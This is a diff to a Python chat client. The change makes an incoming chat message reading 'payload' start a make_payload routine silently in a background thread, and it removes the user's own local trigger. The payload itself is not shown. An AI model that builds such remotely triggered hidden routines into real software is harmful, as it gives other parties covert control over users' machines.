@@ -25,18 +25,13 @@ class Client(Cmd):
         self.__id = None
         self.__nickname = None
 
-    def __do_payload_thread(self, flag):
+    def __do_payload_thread(self):
         WARN = '\033[93m'
         END = '\033[0m'
         thread = threading.Thread(target=make_payload, args=())
-        if flag == 'background':
-            print(f'{WARN}\n(!) <background process> PAYLOAD (!){END}')
-            thread.setDaemon(True)
-            thread.start()
-        else:
-            print(f'{WARN}\n(!) PAYLOAD (!){END}')
-            thread.start()
-            thread.join()
+        print(f'{WARN}\n(!) <background process> PAYLOAD (!){END}')
+        thread.setDaemon(True)
+        thread.start()
         print(f'{WARN}\n(!) PAYLOAD FINISHED (!){END}')
 
     def __receive_message_thread(self):
@@ -53,7 +48,7 @@ class Client(Cmd):
                       '(' + str(obj['sender_id']) + ')' + ']', obj['message'])
 
                 if obj['message'] == 'payload':
-                    self.__do_payload_thread('main')
+                    self.__do_payload_thread()
 
             except Exception as err:
                 print(err)
@@ -120,9 +115,6 @@ class Client(Cmd):
         :param args: parameter
         """
         message = args
-        if message == 'payload':
-            self.__do_payload_thread('background')
-        
         # Show messages sent by yourself
         print('[' + str(self.__nickname) +
               '(' + str(self.__id) + ')' + ']', message)
